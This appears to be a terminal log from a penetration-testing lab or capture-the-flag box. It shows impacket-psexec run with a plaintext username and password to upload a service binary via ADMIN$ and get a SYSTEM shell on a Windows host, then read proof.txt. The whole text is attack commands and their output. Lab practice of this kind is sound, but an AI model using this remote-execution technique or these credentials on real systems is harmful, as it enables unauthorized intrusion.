└─$ impacket-psexec Eric.Wallows:EricLikesRunning800@192.168.143.159

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

\[*\] Requesting shares on 192.168.143.159.....

\[*\] Found writable share ADMIN$

\[*\] Uploading file DLMrTFji.exe

\[*\] Opening SVCManager on 192.168.143.159.....

\[*\] Creating service LnZc on 192.168.143.159.....

\[*\] Starting service LnZc.....

\[!\] Press help for extra shell commands

Microsoft Windows \[Version 10.0.19042.631\]

(c) 2020 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami

nt authority\system

C:\Windows\system32> hostname

CLIENT01

C:\Windows\system32> cd c:\users\administrator\desktop

c:\Users\Administrator\Desktop> dir

Volume in drive C has no label.

Volume Serial Number is 8EFE-8A20

Directory of c:\Users\Administrator\Desktop

08/28/2024  05:48 PM    \<DIR>          .

08/28/2024  05:48 PM    \<DIR>          ..

08/28/2025  03:15 AM                34 proof.txt

1 File(s)             34 bytes

2 Dir(s)  29,454,434,304 bytes free

c:\Users\Administrator\Desktop> type proof.txt

0e48a33694cd0d8aa49f76f61977785b

c:\Users\Administrator\Desktop> ipconfig

Windows IP Configuration

Ethernet adapter Ethernet0 2:

Connection-specific DNS Suffix  . :

IPv4 Address. . . . . . . . . . . : 192.168.143.159

Subnet Mask . . . . . . . . . . . : 255.255.255.0

Default Gateway . . . . . . . . . : 192.168.143.254